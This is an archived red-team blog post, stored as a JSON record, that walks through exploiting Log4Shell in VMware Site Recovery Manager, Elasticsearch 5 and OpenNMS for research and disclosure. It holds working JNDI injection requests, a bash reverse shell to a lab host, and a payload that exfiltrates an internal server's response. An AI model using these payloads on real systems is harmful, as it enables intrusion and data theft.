{
    "id": "752bea81-20c1-406a-bbad-5a81083b12dc",
    "created_at": "2023-01-12T14:59:04.422385Z",
    "updated_at": "2025-03-27T02:05:30.510351Z",
    "deleted_at": null,
    "sha1_hash": "5fda7cbacd1590e65fe2cc9610343fa9fe1d58d4",
    "title": "2022-07-13 - The Long Tail of Log4Shell Exploitation",
    "authors": "",
    "file_creation_date": "2022-07-18T18:28:05Z",
    "file_modification_date": "2022-07-18T18:28:05Z",
    "file_size": 4996964,
    "plain_text": "# The Long Tail of Log4Shell Exploitation\n\n**horizon3.ai/the-long-tail-of-log4shell-exploitation/**\n\nby [Naveen Sunkavally | Jul 13, 2022 |](https://www.horizon3.ai/author/nsunkavally/) [Blog,](https://www.horizon3.ai/category/blog/) [Red Team](https://www.horizon3.ai/category/blog/red-team/)\n\nby [Naveen Sunkavally | Jul 13, 2022 |](https://www.horizon3.ai/author/nsunkavally/) [Blog,](https://www.horizon3.ai/category/blog/) [Red Team](https://www.horizon3.ai/category/blog/red-team/)\n\n\nJuly 13, 2022\n\n\n-----\n\n[It s been more than six months since the Log4Shell vulnerability (CVE-2021-44228) was](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)\ndisclosed, and a number of post-mortems have come out talking about lessons learned and\nways to prevent the next Log4Shell-type event from happening. The reality on the ground\nthough is that the vulnerability is far from dead. For the first six months of this year,\nNodeZero, our autonomous pentesting tool, has detected and exploited Log4Shell in close to\na quarter of the environments it’s run in, and that rate has held steady month over month.\n[This is consistent with the recent CISA advisory sounding the alarm that threat actors are](https://www.cisa.gov/uscert/ncas/alerts/aa22-174a)\ncontinuing to exploit VMWare Horizon servers using Log4Shell.\n\n\n**Month (2022)**\n\n\n**% Internal Networks that NodeZero Detected & Exploited Log4Shell**\n\n\nJanuary 22.0\n\nFebruary 25.9\n\nMarch 32.1\n\nApril 23.3\n\nMay 18.5\n\nJune 22.1\n\nTotal 23.5\n\nNaturally a lot of exploitation of Log4Shell to date has been focused on well-known, widely\ndeployed applications such as VMware Horizon, VMware vCenter, and the Unifi Network\napplication. But this is the tip of the iceberg. There are probably thousands of Java\napplications out there impacted by Log4shell to varying degrees, and thousands of new\nexploit paths to be discovered. All it takes is for a motivated attacker to turn his or her focus\nonto a specific application being run by an enterprise, and within a day or two, an exploit can\nbe potentially developed and weaponized.\n\nWe’ll walk through the exploit process below, leading to remote code execution, against a\nfew applications: VMware Site Recovery Manager, Elasticsearch 5, and OpenNMS. The\npurpose of this is to demonstrate the widespread and long-standing impact of Log4Shell and\nthe speed at which exploits can be developed. Ultimately, one of the goals of NodeZero as a\npentesting tool is to surface the true impact of various vulnerabilities, misconfigurations, and\ncompromised credentials. We believe this impact is best demonstrated through proof of\nactual exploitation. We’ve seen that knowledge of this kind of impact is what enables\ncompanies to accurately evaluate risk and prioritize the work needed to best improve their\nsecurity posture.\n\n## Background\n\n\n-----\n\nWe assume readers are familiar with how the Log4Shell vulnerability works. If you need a\n[refresher, we’ve written previously about Log4Shell before here and](https://www.horizon3.ai/red-team-blog-cve-2021-44228/) [here.](https://www.horizon3.ai/using-nodezero-to-find-and-fix-log4shell/)\n\nIn general, the exploit process for Log4Shell consists of two steps:\n\n**Identifying a JNDI lookup injection point: This is the network request that an**\nunauthenticated attacker sends to the application that will cause the application to log a\nmessage using the vulnerable Apache log4j2 library, which in turn will cause the\napplication to make a JNDI lookup to an attacker-hosted server.\n**Figuring out what Java payload to serve from the attacker-hosted server: This is**\nthe payload that’s retrieved by the vulnerable application via the JNDI lookup and\ndeserialized to execute remote code.\n\nFor the first step, to verify the JNDI lookup injection point, we used the DNSLog service at\n[dnslog.cn to catch DNS callbacks from the vulnerable application. Other tools like Burp](http://dnslog.cn/)\nCollaborator or an Interactsh server can also be used for this purpose.\n\n## Exploiting VMware Site Recovery Manager\n\n\n-----\n\n[VMware Site Recovery Manager is “the industry-leading disaster recovery (DR) management](https://www.vmware.com/products/site-recovery-manager.html)\nsolution, designed to minimize downtime in case of a disaster.” It’s one of many VMware\n[applications affected by Log4Shell from the VMware Log4Shell advisory. We installed](https://www.vmware.com/security/advisories/VMSA-2021-0028.html)\nversion 8.3.0 in our lab. The application exposes two ports, 443 for the SRM application and\n5480 for managing the SRM appliance.\n\n### Detection\n\nFor a quick win, we initially tried inserting a JNDI payload into the username field of the login\nform of the SRM application, but we failed to get a DNS callback. So then we pulled the jar\nfiles from the SRM appliance and decompiled them, and starting probing API endpoints that\nan unauthenticated attacker could access. Shortly after we identified an injection point in the\n```\nOAuth2LoginServlet using the error parameter. The servlet is accessible at the\n/dr/authentication/oauth2/oauth2login endpoint.\n\n```\n\n-----\n\nWe verified the injection point by sending an HTTP GET request of this form:\n```\ncurl --path-as-is -k 'https://10.0.40.79/dr/authentication/oauth2/oauth2login?\nerror=%24%7Bjndi:ldap:%2f%2fil2gm4.dnslog.cn:1389%7D'\n\n```\nAnd got the expected DNS callback:\n\n### Exploitation\n\n\n-----\n\nJust like Horizon and vCenter, SRM uses Apache Tomcat as its application server. Tomcatbased applications that are vulnerable to Log4Shell are easy to exploit for remote code\n[execution, regardless of the Java runtime version. The general technique is described here](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)\nand automated by the JNDI-Exploit-Kit tool.\n\nWe started up JNDI-Exploit-Kit on the attacker server to serve a bash reverse shell payload,\nand a netcat listener to catch a reverse shell on port 9999:\n\nThen fired off the HTTP request to trigger the callback to the JNDI-Exploit-Kit server:\n```\ncurl --path-as-is -k 'https://10.0.40.79/dr/authentication/oauth2/oauth2login?\nerror=%24%7Bjndi:rmi:%2f%2f10.0.220.200:1099%2fnyceyo%7D'\n\n```\nAnd got a shell as the `tomcat user:`\n\n\n-----\n\nNodeZero automates all the above steps, resulting in the following proof demonstrating\nremote code execution against a vulnerable SRM instance:\n\n### Impact\n\nSRM is not typically deployed to be Internet facing. We only found ~20 of them publicly\nexposed using Shodan. However we do see it occasionally in internal pentests, and it could\nbe an attractive target for threat actors seeking to make a ransomware incident even more\npainful by disrupting disaster recovery plans. We recommend updating the appliance to the\nlatest version per VMware’s [advisory or applying the workaround described here.](https://www.vmware.com/security/advisories/VMSA-2021-0028.html)\n\n## Exploiting Elasticsearch 5\n\n\n-----\n\n[Elasticsearch is a popular open-source distributed search and analytics engine. The](https://www.elastic.co/what-is/elasticsearch)\n[Elasticsearch advisory for Log4Shell says that only Elasticsearch 5 is vulnerable to remote](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476)\ncode execution because of the way Elasticsearch uses the Java Security Manager to lock\ndown permissions. We were able to confirm this is the case – in vulnerable versions of\nElasticsearch versions 6 and beyond, the application will perform DNS lookups of attackercontrolled host names but not initiate any TCP connections to attacker-controlled servers.\nThe DNS lookups can be used to leak system information such as environment variables,\nbut remote code execution is not possible. This can be seen through the difference in the\n\n`security.policy file for` [version 5.6 vs.](https://github.com/elastic/elasticsearch/blob/5.6/core/src/main/resources/org/elasticsearch/bootstrap/security.policy) [version 6.0.](https://github.com/elastic/elasticsearch/blob/6.0/core/src/main/resources/org/elasticsearch/bootstrap/security.policy)\n\nFor testing we set up various versions of Elasticsearch 5 from the Elasticsearch docker repo\nat `docker.elastic.co/elasticsearch .`\n\n### Detection\n\nWe found a few methods to trigger JNDI lookups through the Elasticsearch REST API by\n[creating resources like types or triggering deprecation warnings. However we found these](https://www.elastic.co/blog/index-vs-type)\nmethods to be too destructive/noisy, or they didn’t work universally against all versions of\nElasticsearch 5.\n\n[Looking more closely at the source code and issues on Github, we found an issue indicating](https://github.com/elastic/elasticsearch/issues/49428)\nthat sending a malformed JSON as part of a search request will trigger an internal server\nerror that is then logged. We verified this works against all versions of Elasticsearch 5 and\nbeyond up to 7.6. For instance:\n```\ncurl --path-as-is -X GET 'http://192.168.0.140:9200/_search?\na=$%7Bjndi:ldap://oyfbln.dnslog.cn%7D' -d '{'\n\n```\nTriggers this error:\n\nWhich results in a DNS callback:\n\n\n-----\n\n### Exploitation\n\nElasticsearch runs on the Netty framework, so the Tomcat-based exploit used against\nVMware Site Recovery Manager doesn’t apply here. We decided to explore the next best\noption, which is a remote class-loading attack against applications running with Java runtime\nversions < 8u191. This remote class-loading attack is automated by tools like rogue-jndi.\n\nWe pulled a bunch of different versions of Elasticsearch 5 from the\n```\ndocker.elastic.co/elasticsearch repo to understand the Java runtime version they\n\n```\nwere bundled with. We found that all versions from 5.0.0 to 5.6.12 were running Java runtime\nversions < 8u191, and versions from 5.6.13 to 5.6.16 were running Java runtime >= 8u191.\nWhile not everyone runs Elasticsearch using Docker images from\n```\ndocker.elastic.co/elasticsearch, we surmise from this that most of the Elasticsearch\n\n```\n5 instances running in the wild are exploitable to remote code execution using the remote\nclass-loading attack.\n\nOne wrinkle we discovered with exploitation is that remote code execution is not the same as\n_arbitrary code execution. In particular, because of Elasticsearch’s usage of the Security_\nManager, running host commands directly with `Runtime.exec or` `ProcessBuilder was`\nnot possible, and access to the file system was limited. We did find it was possible to make\narbitrary network calls, read from/write to a few directories like `/tmp, and run stuff in`\nmemory like a crypto miner.\n\n\n-----\n\nFor instance, to send a network request to an internal server hosted at 10.0.220.54 and send\nthe response back to the attacker’s server on port 9999, we modified the `HTTPServer class`\nin rogue-jndi to use the following payload:\n```\n{ new javax.script.ScriptEngineManager().getEngineByName(\\\"nashorn\\\").eval(\\\"var\nresponse = \\'\\'; var is = new java.io.BufferedReader(new\njava.io.InputStreamReader(new java.net.URL(\\'http://10.0.220.54\\').openStream()));\nvar inputLine=null; while( (inputLine=is.readLine()) != null) response += inputLine;\nis.close(); var s = new java.net.Socket(\\'192.168.0.140\\', 9999); var os = new\njava.io.BufferedWriter(new java.io.OutputStreamWriter(s.getOutputStream()));\nos.write(response); os.flush(); s.close();\\\"); }\n\n```\nWe set up a simple test internal server on 10.0.220.54:\n\nThen started up rogue-jndi and netcat listener on port 9999:\n\nAnd sent the request to trigger the JNDI lookup:\n```\ncurl --path-as-is -X GET 'http://192.168.0.140:9200/_search?\na=$%7Bjndi:ldap://192.168.0.140:1389/o=reference%7D' -d '{'\n\n```\nWhich resulted in exfiltrating data from the internal server:\n\n\n-----\n\nNodeZero automates all the above steps, resulting in the following proof demonstrating\nremote code execution against a vulnerable Elasticsearch instance:\n\nTo exploit Elasticsearch 5 versions running with Java >= 8u191, a deserialization gadget\nmust be found among the libraries in the classpath of the Elasticsearch application. We\nnoticed that Elasticsearch 5 pulls in the `groovy-2.4.6-indy.jar library, which is`\n[vulnerable to CVE-2016-6814 and exploitable using the technique described here. However,](https://nvd.nist.gov/vuln/detail/CVE-2016-6814)\nwe were thwarted from executing this gadget by the Security Manager and did not pursue\nexploitation further.\n\n### Impact\n\nUsing the Shodan API, we found a total of 22914 Elasticsearch servers exposed on the\nInternet without authentication. Of these, 1275 were found to be running Elasticsearch 5, and\namong those, 955 servers are running a version <= 5.6.12, and therefore are likely to be\nrunning a Java runtime < 8u191. Based on this we estimate there are roughly 900-1000\nElasticsearch 5 servers on the Internet that are exploitable to remote code execution using\nthe technique described above. Of course, it’s already bad to have an open Elasticsearch\nserver on the Internet – now those servers can also be abused to pivot into internal\nnetworks. If you’re running a vulnerable version of Elasticsearch, we recommend following\n[the remediation guidance in the Elasticsearch advisory to update to the latest or apply a](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476)\nwork-around.\n\nKudos must be given to the Elasticsearch team for its prescient usage of the Java Security\nManager and practicing “defense-in-depth.” The fallout for Elasticsearch users could have\nbeen much worse. Only a handful of Java applications have taken advantage of the Security\nManager, and it’ll be interesting to see the path forward with the removal of the Security\n[Manager with JEP-411.](https://openjdk.org/jeps/411)\n\n## Exploiting OpenNMS\n\n\n-----\n\n[OpenNMS is an open source network monitoring solution. We installed OpenNMS Horizon](https://github.com/OpenNMS/opennms)\n[version 26.2.2 using the docker-compose template from here.](https://github.com/opennms-forge/opennms-demo)\n\n### Detection\n\nFor a quick win, we tried injecting a JNDI payload into the username field of the login form…\nand it worked.\n\nThe DNS callback:\n\nUsing `curl :`\n\n\n-----\n\n```\ncurl X POST k path as is\nhttp://192.168.0.140:8980/opennms/j_spring_security_check -d\n'j_username=${jndi:ldap://72qhcc.dnslog.cn:1389}&j_password=abcd&j_usergroups=&Login='\n\n```\nWe checked the logs and found the username was getting logged by the\n```\nHybridOpenNMSUserAuthenticationProvider  class.\n\n```\nIn [Github:](https://github.com/OpenNMS/opennms/blob/master/features/springframework-security/src/main/java/org/opennms/web/springframework/security/HybridOpenNMSUserAuthenticationProvider.java)\n\n### Exploitation\n\nThe version of OpenNMS we were using was running with Java 11.07 using Jetty as an\napplication server. This means the Tomcat-based exploit we used against VMware Site\nRecovery Manager and the older JVM based exploit we used against Elasticsearch 5 weren’t\ngoing to work. We moved to option 3: finding a deserialization gadget in one of the libraries\npulled in locally OpenNMS. Looking through the jars, we found `commons-beanutils-`\n```\n1.9.4.jar, for which there is a well-known deserialization gadget available using ysoserial.\n\n```\nUsing the [ysoserial-modified project, we created our reverse shell payload:](https://github.com/pimps/ysoserial-modified)\n```\n$JAVA_HOME/bin/java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar CommonsBeanutils1\nbash 'bash -i >& /dev/tcp/192.168.0.140/9999 0>&1' > test_payload\n\n```\nThen served it using JNDI-Exploit-Kit and fired up a netcat listener on port 9999:\n\n\n-----\n\nThen sent the curl request to trigger the exploit:\n```\ncurl -X POST -k --path-as-is\nhttp://192.168.0.140:8980/opennms/j_spring_security_check -d\n'j_username=${jndi:ldap://192.168.0.140:1389/serial/CustomPayload}&j_password=abcd&j_u\n\n```\nAnd got the reverse shell:\n\n\n-----\n\nNodeZero automates all the above steps, resulting in the following proof demonstrating\nremote code execution against a vulnerable OpenNMS instance:\n\n### Impact\n\nOpenNMS is not commonly deployed to be Internet-facing. Using Shodan, we found about\n~100 public instances of it. We do occasionally run into it in internal pentests though, and it\n[can also be embedded in products like Juniper Junos Space. From an attacker perspective,](https://www.juniper.net/us/en/products/sdn-and-orchestration/junos-space-platform.html)\nnetwork monitoring solutions in general are attractive targets to compromise because they\ntypically store credentials used to access other infrastructure in the environment. We\n[recommend updating to the latest version per the OpenNMS advisory.](https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/)\n\n## Conclusion\n\nAttackers are opportunistic. As we’ve shown above, Log4shell is a vulnerability that opens up\nlots of opportunities. It’s normally difficult, if not impossible, for the average attacker to\ndiscover vulnerabilities leading to unauthenticated remote code execution in established\napplications. Log4Shell enables exactly that across lots of applications, and it’s something\nthat can be easily weaponized by attackers on the fly.\n\nHere’s roughly how long it took us to get to unauthenticated remote code execution in each\nof the above applications:\n\n**Application** **Time to Install and Configure** **Time to RCE**\n\nVMware Site Recovery Manager 8.3.0 1 day 1 hour\n\nElasticsearch 5 1/2 day 1 day\n\nOpenNMS Horizon 26.2.2 1 hour 1 hour\n\nIn an ideal world, after the Log4shell vulnerability was disclosed last year, all enterprises\nwould have spent 2-3 weeks to enumerate all vulnerable applications in their environment\nand patch them. The reality is that enterprise patch cycles can be slow. NodeZero still\n\n\n-----\n\noccasionally encounters domain controllers that aren t patched for critical vulnerabilities like\n[Zerologon (CVE-2020-1472), and routinely sees Eternal Blue (CVE-2017-0143) five years](https://nvd.nist.gov/vuln/detail/cve-2020-1472)\nafter it was disclosed.\n\nFurthermore, outside of very large enterprises, many companies operate with limited\nresources, must prioritize remediation relative to other work, and have to consider possible\nbusiness downtime caused by patching. Log4Shell brings extra complexity to the mix\nbecause of the sheer number of applications it impacts. Patching for Log4Shell is also not\nalways just clicking an “update” button; legacy applications may lack support altogether. And\neven after patching, we’ve encountered cases where the patch didn’t work as expected and\nneeded to be re-done.\n\nAll this means that Log4Shell will be around for a very long time. We believe that the more\nwe can do to surface the true impact of Log4Shell against vulnerable applications, the more\nlikely it is that companies will take the steps necessary to remediate those applications,\nbefore the bad guys can get to them.\n\n## References\n\n How can NodeZero help you?\n\nLet our experts walk you through a demonstration of NodeZero, so you can see how to put it\nto work for your company.\n\n[Schedule a Demo](https://go.horizon3ai.com/demo)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-13 - The Long Tail of Log4Shell Exploitation.pdf"
    ],
    "report_names": [
        "2022-07-13 - The Long Tail of Log4Shell Exploitation.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535544,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1658168885,
    "ts_modification_date": 1658168885,
    "files": {
        "pdf": "https://archive.orkl.eu/5fda7cbacd1590e65fe2cc9610343fa9fe1d58d4.pdf",
        "text": "https://archive.orkl.eu/5fda7cbacd1590e65fe2cc9610343fa9fe1d58d4.txt",
        "img": "https://archive.orkl.eu/5fda7cbacd1590e65fe2cc9610343fa9fe1d58d4.jpg"
    }
}